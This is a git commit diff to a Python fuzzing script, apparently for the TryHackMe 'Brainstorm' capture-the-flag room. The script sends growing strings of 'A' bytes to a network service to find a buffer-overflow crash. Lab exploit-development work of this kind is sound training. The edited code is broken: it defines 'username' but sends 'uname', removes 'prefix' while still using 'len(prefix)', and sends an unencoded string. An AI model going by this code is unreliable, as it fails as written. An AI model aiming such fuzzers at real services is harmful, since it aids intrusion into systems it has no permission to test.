ac72907fd26b211a4cecf607b8ac4eb918df7b7b
David De Maya Merras <45432332+hardsoftsecurity@users.noreply.github.com>
2023-09-07 23:54:08 +0200

    Update fuzzer.py
    I modified the script to be more general. Also I modified to do fuzzing to the second parameter. This script works for the "Brainstorm" room from Try Hack Me.

--- fuzzer.py
+++ fuzzer.py
@@ -2,13 +2,13 @@
 
 import socket, time, sys
 
-ip = "MACHINE_IP"
+ip = "MACHINE_IP" # Put the objetive IP
+username = "User" # Example User
 
-port = 1337
+port = 1337 # Replace with the destination port.
 timeout = 5
-prefix = "OVERFLOW1 "
 
-string = prefix + "A" * 100
+string = "A" * 100 # Payload
 
 while True:
   try:
@@ -16,8 +16,10 @@ while True:
       s.settimeout(timeout)
       s.connect((ip, port))
       s.recv(1024)
+      s.send(uname + '\r\n') # Send the username
+      s.recv(1024)
       print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
-      s.send(bytes(string, "latin-1"))
+      s.send(bytes(string, "latin-1")) # Send the payload
       s.recv(1024)
   except:
     print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
